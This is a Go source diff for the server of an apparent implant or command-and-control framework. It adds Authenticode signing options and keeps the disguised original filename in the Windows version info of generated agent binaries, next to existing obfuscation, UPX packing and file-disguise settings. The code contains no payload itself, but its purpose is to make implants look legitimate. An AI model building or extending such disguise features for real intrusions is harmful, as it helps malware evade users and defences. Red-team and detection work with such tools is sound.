@@ -90,6 +90,19 @@ type binaryGenForm struct {
 	Modules             string `form:"modules"`     // comma-separated included agent modules; empty = all (see payload/agent_modules.go)
 	UPX                 string `form:"upx"`         // "true" for post-build UPX --lzma (exe/elf; missing binary = skip)
 	Win7Compat          string `form:"win7_compat"` // "true" for Win7/2008R2 (go1.20.14 toolchain, forces slim, forbids garble)
+	// Authenticode signing. PFX bytes are decoded from base64 in
+	// parseBinaryForm and kept only for the lifetime of this request; the
+	// password is never logged or audited.
+	SignMode        string `form:"sign_mode"` // "", "self", "pfx", "pem"
+	SignOrg         string `form:"sign_org"`
+	SignPFXBase64   string `form:"sign_pfx_b64"`
+	SignPFXPassword string `form:"sign_pfx_password"`
+	SignCertPEM     string `form:"sign_cert_pem"`
+	SignKeyPEM      string `form:"sign_key_pem"`
+	SignPFX         []byte `form:"-"`
+	// OriginalFilename is the operator-visible name before the uniqueness
+	// prefix is added; it is embedded in VersionInfo.
+	OriginalFilename string `form:"-"`
 }
 
 // parseBinaryForm validates a binary generation request and returns the resolved form.
@@ -238,6 +251,56 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 		form.PEManifestMode = "default"
 	}
 
+	// Authenticode signing options. PFX bytes are decoded with a hard cap and
+	// held only for this request; the password is never logged or audited.
+	// Material validity (password, EKU, expiry, key size) is checked in
+	// validateBinaryBuild so a bad PFX answers 422 before a job or one-shot
+	// registration secret is created.
+	form.SignMode = strings.ToLower(strings.TrimSpace(form.SignMode))
+	if form.SignMode == "none" {
+		form.SignMode = ""
+	}
+	switch form.SignMode {
+	case "", "self", "pfx", "pem":
+	default:
+		respondError(c, http.StatusUnprocessableEntity, "sign_mode must be self, pfx or pem")
+		return nil, false
+	}
+	form.SignOrg = strings.TrimSpace(form.SignOrg)
+	form.SignPFXBase64 = strings.TrimSpace(form.SignPFXBase64)
+	if form.SignPFXBase64 != "" {
+		if len(form.SignPFXBase64) > 96*1024 {
+			respondError(c, http.StatusUnprocessableEntity, "sign_pfx_b64 is too large (max 64KB PFX)")
+			return nil, false
+		}
+		raw, err := base64.StdEncoding.DecodeString(form.SignPFXBase64)
+		if err != nil {
+			respondError(c, http.StatusUnprocessableEntity, "sign_pfx_b64 is not valid base64")
+			return nil, false
+		}
+		if len(raw) > 64*1024 {
+			respondError(c, http.StatusUnprocessableEntity, "PFX exceeds 64KB")
+			return nil, false
+		}
+		form.SignPFX = raw
+	}
+	if form.SignMode == "pfx" && len(form.SignPFX) == 0 {
+		respondError(c, http.StatusUnprocessableEntity, "sign_mode=pfx requires sign_pfx_b64")
+		return nil, false
+	}
+	if form.SignMode != "pfx" && len(form.SignPFX) > 0 {
+		respondError(c, http.StatusUnprocessableEntity, "sign_pfx_b64 requires sign_mode=pfx")
+		return nil, false
+	}
+	if form.SignMode == "pem" && (strings.TrimSpace(form.SignCertPEM) == "" || strings.TrimSpace(form.SignKeyPEM) == "") {
+		respondError(c, http.StatusUnprocessableEntity, "sign_mode=pem requires sign_cert_pem and sign_key_pem")
+		return nil, false
+	}
+	if form.SelfCheck && form.SignMode != "" {
+		respondError(c, http.StatusUnprocessableEntity, "self_check and Authenticode signing cannot be combined: the signature rewrites bytes covered by the integrity hash")
+		return nil, false
+	}
+
 	// Agent module selection: comma-separated catalogue names, empty = every
 	// module. Validated at the API boundary so a typo answers 400 instead of
 	// surfacing as a build error (or, worse, silently narrowing the payload).
@@ -258,6 +321,9 @@ func (s *Server) parseBinaryForm(c *gin.Context) (*binaryGenForm, bool) {
 		if origDisguise && !strings.Contains(strings.ToLower(form.Filename), disguiseExtWant) {
 			form.Filename = payload.ApplyDisguiseFilename(form.Filename, form.DisguiseAs)
 		}
+		// Keep the operator-visible name for VersionInfo/OriginalFilename
+		// before adding the server's uniqueness prefix.
+		form.OriginalFilename = form.Filename
 		shortID := strings.Replace(util.NewString()[:8], "-", "", -1)
 		form.Filename = fmt.Sprintf("%s_%s", shortID, form.Filename)
 	}
@@ -427,6 +493,13 @@ func (s *Server) buildImplantConfig(form *binaryGenForm) (payload.ImplantConfig,
 		Modules:               parseModuleSelection(form.Modules),
 		UPX:                   form.UPX == "true" || form.UPX == "1",
 		Win7Compat:            form.Win7Compat == "true" || form.Win7Compat == "1",
+		SignMode:              form.SignMode,
+		SignOrg:               form.SignOrg,
+		SignPFX:               form.SignPFX,
+		SignPFXPassword:       form.SignPFXPassword,
+		SignCertPEM:           []byte(form.SignCertPEM),
+		SignKeyPEM:            []byte(form.SignKeyPEM),
+		OriginalFilename:      form.OriginalFilename,
 	}, nil
 }
 
@@ -484,6 +557,12 @@ func (s *Server) validateBinaryBuild(form *binaryGenForm, goos, format string) e
 		Win7Compat:      form.Win7Compat == "true" || form.Win7Compat == "1",
 		Obfuscate:       form.Obfuscate == "true" || form.Obfuscate == "1",
 		SelfCheck:       form.SelfCheck,
+		SignMode:        form.SignMode,
+		SignOrg:         form.SignOrg,
+		SignPFX:         form.SignPFX,
+		SignPFXPassword: form.SignPFXPassword,
+		SignCertPEM:     []byte(form.SignCertPEM),
+		SignKeyPEM:      []byte(form.SignKeyPEM),
 	}
 	return payload.ValidateImplantBuild(goos, format, &cfg)
 }
